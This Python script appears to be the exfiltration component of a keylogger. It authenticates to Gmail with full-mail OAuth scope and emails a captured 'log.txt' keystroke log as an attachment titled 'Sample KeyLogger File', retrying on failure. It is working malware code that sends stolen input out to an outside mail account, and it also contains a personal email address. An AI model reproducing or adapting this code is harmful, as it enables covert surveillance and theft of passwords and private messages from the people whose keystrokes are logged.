from email.mime.multipart import MIMEMultipart
import os.path
from turtle import delay
from google.auth.transport.requests import Request
from google.oauth2.credentials import Credentials
from google_auth_oauthlib.flow import InstalledAppFlow
import base64
import mimetypes
import os
from email.mime.audio import MIMEAudio
from email.mime.base import MIMEBase
from email.mime.image import MIMEImage
from email.mime.text import MIMEText
from googleapiclient.discovery import build
from googleapiclient.errors import HttpError
from retry import retry

# If modifying these scopes, delete the file token.json.
SCOPES = ['https://mail.google.com/']


#Authenticates me with downloaded credenetials
def get_service():
    creds = None
    if os.path.exists('token.json'):
        creds = Credentials.from_authorized_user_file('token.json', SCOPES)
    # If there are no (valid) credentials available, let the user log in.
    if not creds or not creds.valid:
        if creds and creds.expired and creds.refresh_token:
            creds.refresh(Request())
        else:
            flow = InstalledAppFlow.from_client_secrets_file(
                'credentials.json', SCOPES)
            creds = flow.run_local_server(port=0)
        # Save the credentials for the next run
        with open('token.json', 'w') as token:
            token.write(creds.to_json())

    try:
        # Call the Gmail API
        service = build('gmail', 'v1', credentials=creds)
        return service
        
    except HttpError as error:
        # TODO(developer) - Handle errors from gmail API.
        print(f'An error occurred: {error}')


#A function that handles sending the email
def gmail_send_message(service, user_id, message):

    try:
        message = (service.users().messages().send
                        (userId=user_id, body=message).execute())
        print(F'Message Id: {message["id"]}')
        return message
    except HttpError as error:
        print(F'An error occurred: {error}')
        message = None
        return message

#Function handles creating the message
def create_message_with_attachment(sender,to,subject,body,file):
    message = MIMEMultipart()
    message['To'] = to
    message['From'] = sender
    message['Subject'] = subject

    msg = MIMEText(body)
    message.attach(msg)

    (content_type, encoding) = mimetypes.guess_type(file)

    if content_type is None or encoding is not None:
        content_type = 'application/octet-stream'

    (main_type, sub_type) = content_type.split('/',1)

    if main_type == 'text':
        with open(file,'rb') as f:
            msg = MIMEText(f.read().decode('utf-8'),_subtype=sub_type)
    
    elif main_type == 'image':
        with open(file,'rb') as f:
            msg = MIMEImage(f.read(), _subtype=sub_type)

    elif main_type =='audio':
        with open(file,'rb') as f:
            msg = MIMEAudio(f.read(), _subtype=sub_type)

    else:
        with open(file,'rb') as f:
            msg = MIMEBase(main_type,sub_type)
            msg.set_payload(f.read())

    filename = os.path.basename(file)
    msg.add_header('Content-Disposition', 'attachment', filename=filename)
    message.attach(msg)

    raw_message = base64.urlsafe_b64encode(message.as_string().encode('utf-8'))

    return {'raw':raw_message.decode('utf-8')}


@retry((Exception), tries=3, delay=2,backoff=2)  #backoff makes each run delay to be 2,4,8 after each attempt
def send_final_message():
    if __name__ == 'quickstart':
        service = get_service()
        user_id = 'me'
        sender = 'hchibugo21@gmail.com'
        to = 'hchibugo21@gmail.com'
        subject = 'Sample KeyLogger File'
        body = 'This is the keylogger you wanted'
        file = 'log.txt'
        
        msg = create_message_with_attachment(sender,to,subject,body,file)
        gmail_send_message(service,user_id,msg)
    




